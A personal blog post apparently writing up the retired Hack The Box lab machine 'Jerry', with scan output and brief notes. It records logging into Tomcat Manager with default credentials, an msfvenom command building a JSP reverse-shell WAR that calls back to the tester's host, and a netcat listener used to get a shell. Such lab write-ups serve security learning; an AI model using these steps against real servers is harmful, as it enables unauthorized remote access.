---
layout:     post
title:      Hackthebox Notes Jerry Pwned
date:       2021-01-24
summary:    Run against Jerry machine on Hackthebox.eu
categories: CTF
thumbnail: cogs
tags:
 - CTF
 - Hackthebox
 - Owned
---

-Installed AutoRecon at the advisement of the guys in the TryHackMe Discord.  <br>
-Ran AutoRecon against target host 10.10.10.95<br>

Gobuster:
{% highlight ruby %}
SCAN OUTPUT
/aux (Status: 200) [Size: 0]
/docs (Status: 302) [Size: 0]
/examples (Status: 302) [Size: 0]
/favicon.ico (Status: 200) [Size: 21630]
/host-manager (Status: 302) [Size: 0]
/index.jsp (Status: 200) [Size: 11398]
/lpt1 (Status: 200) [Size: 0]
/lpt2 (Status: 200) [Size: 0]
/manager (Status: 302) [Size: 0]
/prn (Status: 200) [Size: 0]
{% endhighlight %}

Nikto:
{% highlight ruby %}
SCAN OUTPUT
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.95
+ Target Hostname:    10.10.10.95
+ Target Port:        8080
+ Start Time:         2021-01-23 21:34:02 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
+ 7968 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2021-01-23 21:43:01 (GMT-6) (539 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

Nmap:
{% highlight ruby %}
SCAN OUTPUT
# Nmap 7.91 scan initiated Sat Jan 23 21:33:45 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/cpardue/Boxes/jerry/results/10.10.10.95/scans/_full_tcp_nmap.txt -oX /home/cpardue/Boxes/jerry/results/10.10.10.95/scans/xml/_full_tcp_nmap.xml 10.10.10.95
Nmap scan report for 10.10.10.95
Host is up, received user-set (0.055s latency).
Scanned at 2021-01-23 21:33:45 CST for 115s
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 23 21:35:40 2021 -- 1 IP address (1 host up) scanned in 115.20 seconds
{% endhighlight %}

-Visited webserver in browser<br>
-Checked Manager App at /manager/html<br>
-Is a login page<br>
-Looked up and tried default tomcat::s3cret creds<br>
-Logged in, successfully
<br>-Generated msfvenom payload with 
{% highlight ruby %}
sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.xx LPORT=4445 -f war > reverse.war  
{% endhighlight %}
<br>-uploaded via Browse & Upload buttons
<br>-started local netcat shell as 
{% highlight ruby %}
nc -nlvp 4445
{% endhighlight %}
<br>-clicked link in server
<br>-payload reached back out to netcat shell
<br>-cd'ed to C:\Users\Administrator\Desktop via cli and read flag

<br>Overall this machine was a bit boring, but it's a retired machine and was randomly selected based on being an Easy rating, so there you go.  
